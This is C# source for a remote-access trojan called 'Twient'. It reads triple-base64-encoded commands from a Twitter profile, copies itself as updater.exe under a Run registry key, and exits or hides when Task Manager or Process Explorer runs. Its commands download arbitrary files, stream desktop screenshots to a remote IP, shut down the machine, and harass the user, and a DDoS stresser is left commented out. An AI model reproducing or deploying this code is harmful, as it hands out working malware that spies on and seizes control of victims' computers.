﻿/*
 * User: Voraka
 * Date: 6/6/2017
 */
using System;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing;
using System.Drawing.Imaging;

namespace Twient
{
	/// <summary>
	/// Class with program entry point.
	/// </summary>
	internal sealed class Program
	{
		/// <summary>
		/// Program entry point.
		/// </summary>
		[STAThread]
		
		
		
		
		
		
		
		
		public static string Decode(string base64EncodedData)
		{
			byte[] bytes = Convert.FromBase64String(base64EncodedData);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000029B8 File Offset: 0x00000BB8
		public static string Encode(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			return Convert.ToBase64String(bytes);
		}
		
		
		public static string getBetween(string strSource, string strStart, string strEnd)
		{
			string result;
			try
			{
				if (strSource.Contains(strStart) && strSource.Contains(strEnd))
				{
					int num = strSource.IndexOf(strStart, 0) + strStart.Length;
					int num2 = strSource.IndexOf(strEnd, num);
					result = strSource.Substring(num, num2 - num);
				}
				else
				{
					result = "";
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}
		
		
		public static void CheckProcess()
		{			
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			Process[] processesByName2 = Process.GetProcessesByName("perfmon");
			Process[] processesByName3 = Process.GetProcessesByName("procexp64");
			if (processesByName.Length > 0 || processesByName2.Length > 0 || processesByName3.Length > 0)
			{
				Functions.SetCritical(0);
				Environment.Exit(0);
			}		
		}
		
		public static string readtwitter()
		{
			string result;
			try
			{
				WebClient webClient = new WebClient();
				Stream stream = webClient.OpenRead("https://twitter.com/voraka163");
				using (StreamReader streamReader = new StreamReader(stream))
				{
					result = streamReader.ReadToEnd();
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}
		
		private static void panic(string filepath)
		{
			CheckProcess();			
			if (File.Exists(GlobalVars.Backpath + "\\updater.exe")==false)
				File.Copy(filepath, GlobalVars.Backpath + "\\updater.exe");			
			RegistryKey local = Registry.CurrentUser;
			try
			{
				RegistryKey run = local.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
				run.SetValue("updater", GlobalVars.Backpath + "\\updater.exe");				
				local.Close();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message.ToString(), "Info", MessageBoxButtons.OK, MessageBoxIcon.Error);
			}
			
		}
		
		private static void read_cmd()
		{
			string last_key = "";
			while (true)
			{
				string key = "";
				string filepath =System.Windows.Forms.Application.ExecutablePath;			
				string strSource = readtwitter();
				string msg = Decode(Decode(Decode(getBetween(strSource, Encode(Encode(Encode("cmd1"))), Encode(Encode(Encode("cmd2")))))));				
				Regex regex = new Regex("--");
				string[] cut = regex.Split(msg);
				key = cut[0];
				
				if (key=="")
				{
					MessageBox.Show("No key", "Error");
					Functions.SetCritical(0);
					Environment.Exit(0);
				}
				panic(filepath);			
				
				if (key!=last_key)
				{
					last_key = key;				
					switch (key)
					{
						case "crasher":
							{
								//Console.WriteLine("\t hit crasher");
								break;
							}
						
						
						case "Crazymouse":
						{
							//Console.WriteLine("Crazymouse");
		//					Thread thread6 = new Thread(delegate
		//					{
		//						Functions.CrazyMouse((int)Convert.ToInt16(cut[1]));
		//					});
		//					thread6.Start();							
							Functions.CrazyMouse((int)Convert.ToInt16(cut[1]));
							break;
						}
						
						case "Download":
						{
							//Console.WriteLine("Download");
							WebClient webClient = new WebClient();
							webClient.DownloadFile(cut[1], cut[2]);
							break;
						}	
						
						case "Windowtitle":
						{
							//Console.WriteLine("Windowtitle");
							IntPtr foregroundWindow2 = Functions.GetForegroundWindow();
							Functions.SetWindowText(foregroundWindow2, cut[1]);
							break;
						}	
							
						case "StressStart":
						{
							//Console.WriteLine("StressStart");
		//					Stresser.Host = cut[1];
		//					Stresser.Port = int.Parse(cut[2]);
		//					Stresser.Threads = int.Parse(cut[3]);
		//					Stresser.Type = cut[4];
		//					if (Stresser.Type.StartsWith("HTTP") || Stresser.Type.StartsWith("SLOW"))
		//					{
		//						Stresser.Page = cut[5];
		//					}
		//					Stresser.IsStressing = true;
		//					Stresser.Start();
							
							break;
						}	
							
						case "Hidewindow":
						{
							//Console.WriteLine("Hidewindow");
							
							IntPtr foregroundWindow = Functions.GetForegroundWindow();
							Functions.ShowWindow(foregroundWindow, 0);					
							break;
						}	
							
						case "MessageBox":
						{
							MessageBoxIcon icon = MessageBoxIcon.Hand;
							MessageBoxButtons button = MessageBoxButtons.OK;
							Functions.MsgBox(cut[1], cut[2], icon, button);	
							break;
						}
							
						case "CaptureDesktop":
						{
							Rectangle rectangle = default(Rectangle);
							rectangle = Screen.PrimaryScreen.Bounds;
							Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
							Graphics graphics = Graphics.FromImage(bitmap);
							graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
												
							try
							{
								TcpClient tcpClient = new TcpClient(GlobalVars.DesktopIP, 1234);
								BinaryFormatter binaryFormatter = new BinaryFormatter();
								using (NetworkStream stream = tcpClient.GetStream())
								{
									while (true)
									{
										binaryFormatter.Serialize(stream, bitmap);
										Thread.Sleep(1);
									}
								}
							}
							catch
							{
							}
							
							break;
						}	
							
						case "Swapmousebuttons_on":
						{
							Functions.SwapMouseButton(1);
							break;
						}
							
						case "Swapmousebuttons_off":
						{
							Functions.SwapMouseButton(0);
							break;
						}
						
						case "Beeper_Bomb":
						{					
							Thread thread5 = new Thread(new ThreadStart(Functions.Beeper_bomb));
							thread5.Start();
							break;
						}
							
						case "Restart":
						{					
							Functions.Shutdown(2);
							break;
						}	
						
						case "Shutdown":
						{					
							Functions.Shutdown(1);
							break;
						}	
							
					}
			
				}
								
				Thread.Sleep(10000);
			}
			
		}
		
		private static void Main(string[] args)
		{			
			Thread thread = new Thread(new ThreadStart(read_cmd));
			thread.Start();
			
			
			
		}
		
	}
}
